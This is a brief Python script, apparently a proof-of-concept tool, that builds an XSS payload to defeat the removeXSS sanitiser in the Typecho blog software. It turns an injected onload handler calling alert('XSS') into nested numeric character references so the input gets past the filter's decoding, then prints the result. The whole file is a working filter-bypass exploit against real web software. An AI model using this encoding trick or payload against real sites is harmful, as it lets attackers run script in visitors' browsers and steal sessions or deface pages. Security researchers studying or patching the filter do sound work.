# coding: utf-8
"""
Typecho_Common::removeXSS Payload生成
"""

WANTED_RESULT = '" onload=javascript:alert("XSS")'

def exe_encode(wanted_result):
    """
    转换NCR
    """
    ret = ''
    for s_r in wanted_result:
        s_int = ord(s_r)
        ret += ('&#' + str(s_int))
    return ret

def cross_filter(simple_str):
    """
    绕过处理
    """
    simple_list = simple_str.strip('&#').split('&#')
    for key, item in enumerate(simple_list):
        # simple_list[key] = ''.join([exe_encode(c) for c in list(item)])
        simple_list[key] = exe_encode(item[0]) + item[1:]
    return '&#' + '&#'.join(simple_list)

print('wanted_code:', exe_encode(WANTED_RESULT))
print('=' * 25)

payload = cross_filter(exe_encode(WANTED_RESULT))
print('pyaload:', payload)

